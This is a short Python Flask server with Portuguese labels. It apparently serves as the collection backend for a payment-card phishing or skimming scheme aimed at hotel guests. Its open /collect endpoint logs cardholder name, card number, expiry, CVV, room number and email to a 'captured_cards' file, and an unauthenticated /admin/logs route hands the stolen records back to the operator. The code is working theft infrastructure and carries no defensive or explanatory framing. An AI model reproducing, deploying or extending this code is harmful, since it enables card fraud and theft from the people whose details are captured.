from flask import Flask, request, jsonify
from flask_cors import CORS
import datetime
import os

app = Flask(__name__)
CORS(app) 

# O arquivo será salvo na raiz do servidor da Render
LOG_FILE = "captured_cards.txt"

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    
    log_entry = (
        f"--- Nova Captura: {datetime.datetime.now()} ---\n"
        f"Nome: {data.get('cardName')}\n"
        f"Cartão: {data.get('cardNumber')}\n"
        f"Validade: {data.get('cardExpiry')}\n"
        f"CVV: {data.get('cardCvv')}\n"
        f"Quarto: {data.get('room')}\n"
        f"Email: {data.get('email')}\n"
        f"------------------------------------------\n\n"
    )
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
        
    return jsonify({"status": "success"}), 200

@app.route('/admin/logs', methods=['GET'])
def get_logs():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            return jsonify({"logs": f.read()}), 200
    except FileNotFoundError:
        return jsonify({"logs": "Aguardando primeiras capturas..."}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
